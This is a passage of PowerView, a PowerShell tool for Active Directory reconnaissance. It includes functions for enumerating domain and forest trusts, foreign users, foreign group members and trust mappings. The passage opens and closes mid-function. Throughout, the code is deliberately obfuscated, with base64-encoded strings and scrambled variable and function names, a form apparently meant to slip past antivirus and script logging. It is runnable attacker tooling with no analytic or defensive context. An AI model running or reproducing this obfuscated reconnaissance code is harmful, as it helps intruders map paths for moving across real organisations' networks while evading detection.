                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${/=\__/=\_/\__/==\}.name[0]
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${_/\/\/\_/=\/=\/==}
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) $(${_/=======\__/\___} -join ',')
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEQAaQByAGUAYwB0AGkAbwBuAA=='))) $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JAB7AF8AXwAvAFwAXwAvAD0AXABfAF8AXwBfAF8ALwA9AD0AXAB9AA==')))
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAHIAZQBhAHQAZQBkAA=='))) ${/=\__/=\_/\__/==\}.whencreated[0]
                    ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBoAGUAbgBDAGgAYQBuAGcAZQBkAA=='))) ${/=\__/=\_/\__/==\}.whenchanged[0]
                    ${/=\__/\/=\___/\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBMAEQAQQBQAA=='))))
                    ${/=\__/\/=\___/\__}
                }
                if (${_/\__/\/=====\_/\}) {
                    try { ${_/\__/\/=====\_/\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                    }
                }
                ${/==\/===\___/\/=\}.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
                ${/=\_/=\_/==\/==\_} = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                ${/=\_/=\_/==\/==\_} = $Domain
            }
            else {
                ${/=\_/=\_/==\/==\_} = $Null
            }
            ${/=\_/\/=\/==\/\__} = [IntPtr]::Zero
            ${_/===\__/\__/\/==} = 63
            ${/=\______/\/=\/\/} = 0
            ${___/=\/\________/} = ${_/=\___/=\/\/\/==}::DsEnumerateDomainTrusts(${/=\_/=\_/==\/==\_}, ${_/===\__/\__/\/==}, [ref]${/=\_/\/=\/==\/\__}, [ref]${/=\______/\/=\/\/})
            ${_/=\/\_/\/=\_____/} = ${/=\_/\/=\/==\/\__}.ToInt64()
            if ((${___/=\/\________/} -eq 0) -and (${_/=\/\_/\/=\_____/} -gt 0)) {
                ${__/\/===\_/\/\/=\} = ${/===\/=\/\__/\_/\}::GetSize()
                for (${_/\/\__/=\/==\/\_} = 0; (${_/\/\__/=\/==\/\_} -lt ${/=\______/\/=\/\/}); ${_/\/\__/=\/==\/\_}++) {
                    ${/=\/=======\/==\_} = New-Object System.Intptr -ArgumentList ${_/=\/\_/\/=\_____/}
                    ${/==\__/=\_/\_/\__} = ${/=\/=======\/==\_} -as ${/===\/=\/\__/\_/\}
                    ${_/=\/\_/\/=\_____/} = ${/=\/=======\/==\_}.ToInt64()
                    ${_/=\/\_/\/=\_____/} += ${__/\/===\_/\/\/=\}
                    ${/\_____/\/\____/=} = ''
                    ${___/=\/\________/} = ${/=\____/===\/=\_/}::ConvertSidToStringSid(${/==\__/=\_/\_/\__}.DomainSid, [ref]${/\_____/\/\____/=});${__/\_/==\/===\__/} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if (${___/=\/\________/} -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${__/\_/==\/===\__/}).Message)"
                    }
                    else {
                        ${/=\__/\/=\___/\__} = New-Object PSObject
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${/====\__/\/\/\/\_}
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${/==\__/=\_/\_/\__}.DnsDomainName
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) ${/==\__/=\_/\_/\__}.NetbiosDomainName
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) ${/==\__/=\_/\_/\__}.Flags
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) ${/==\__/=\_/\_/\__}.ParentIndex
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${/==\__/=\_/\_/\__}.TrustType
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) ${/==\__/=\_/\_/\__}.TrustAttributes
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQA'))) ${/\_____/\/\____/=}
                        ${/=\__/\/=\___/\__} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) ${/==\__/=\_/\_/\__}.DomainGuid
                        ${/=\__/\/=\___/\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQA='))))
                        ${/=\__/\/=\___/\__}
                    }
                }
                $Null = ${_/=\___/=\/\/\/==}::NetApiBufferFree(${/=\_/\/=\/==\/\__})
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${___/=\/\________/}).Message)"
            }
        }
        else {
            ${/=\/=\/\/=\/=\__/} = __/\/\__/=\/\/\/\/ @_/\_/\__/====\___
            if (${/=\/=\/\/=\/=\__/}) {
                ${/=\/=\/\/=\/=\__/}.GetAllTrustRelationships() | % {
                    $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVAA='))))
                    $_
                }
            }
        }
    }
}
function _______/\/\/\_/\/\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${____/\__/\_/===\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${____/\__/\_/===\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${____/\__/\_/===\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/=\/=\_/====\__/=} = ___________/=\/\__ @____/\__/\_/===\/
        if (${/=\/=\_/====\__/=}) {
            ${/=\/=\_/====\__/=}.GetAllTrustRelationships() | % {
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVAA='))))
                $_
            }
        }
    }
}
function Get-DomainForeignUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        ____/\/====\/\___/ @_/\/\/\/\___/\/\/  | % {
            ForEach (${/=\/\/===\/\/==\/} in $_.memberof) {
                ${__/===\___/=\/\_/} = ${/=\/\/===\/\/==\/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if (${__/===\___/=\/\_/}) {
                    ${____/====\_/=\_/\} = $(${/=\/\/===\/\/==\/}.SubString(${__/===\___/=\/\_/})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${___/====\___/====} = $_.distinguishedname
                    ${/=\/=\/=\/\_/\___} = ${___/====\___/====}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    $UserDomain = $($_.distinguishedname.SubString(${/=\/=\/=\/\_/\___})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${____/====\_/=\_/\} -ne $UserDomain) {
                        ${_/\/\_/===\_/=\/\} = ${/=\/\/===\/\/==\/}.Split(',')[0].split('=')[1]
                        ${/==\____/=\______} = New-Object PSObject
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $_.distinguishedname
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${____/====\_/=\_/\}
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                        ${/==\____/=\______} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${/=\/\/===\/\/==\/}
                        ${/==\____/=\______}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
                        ${/==\____/=\______}
                    }
                }
            }
        }
    }
}
function Get-DomainForeignGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        ${__/\_/\_/\___/==\} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        __/\_/\/\__/==\/\_ @_/\/\/\/\___/\/\/ | ? { ${__/\_/\_/\___/==\} -notcontains $_.samaccountname } | % {
            ${_/\/\_/===\_/=\/\} = $_.samAccountName
            ${__/\_/=\_/\_/====} = $_.distinguishedname
            ${____/====\_/=\_/\} = ${__/\_/=\_/\_/====}.SubString(${__/\_/=\_/\_/====}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
            $_.member | % {
                ${___/=\_/==\/===\/} = $_.SubString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${____/====\_/=\_/\} -ne ${___/=\_/==\/===\/})) {
                    ${/=\/=\____/\/=\_/} = $_
                    ${/=\_/=\/=====\_/=} = $_.Split(',')[0].split('=')[1]
                    ${__/==\___/\_/\/\/} = New-Object PSObject
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${____/====\_/=\_/\}
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${_/\/\_/===\_/=\/\}
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${__/\_/=\_/\_/====}
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${___/=\_/==\/===\/}
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${/=\_/=\/=====\_/=}
                    ${__/==\___/\_/\/\/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${/=\/=\____/\/=\_/}
                    ${__/==\___/\_/\/\/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                    ${__/==\___/\_/\/\/}
                }
            }
        }
    }
}
function Get-DomainTrustMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${___/\_/====\/\_/=} = @{}
    ${/\____/\__/\/=\_/} = New-Object System.Collections.Stack
    ${/=\/\__/\_/\_/=\_} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $API }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\/\__/\_/\_/=\_}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
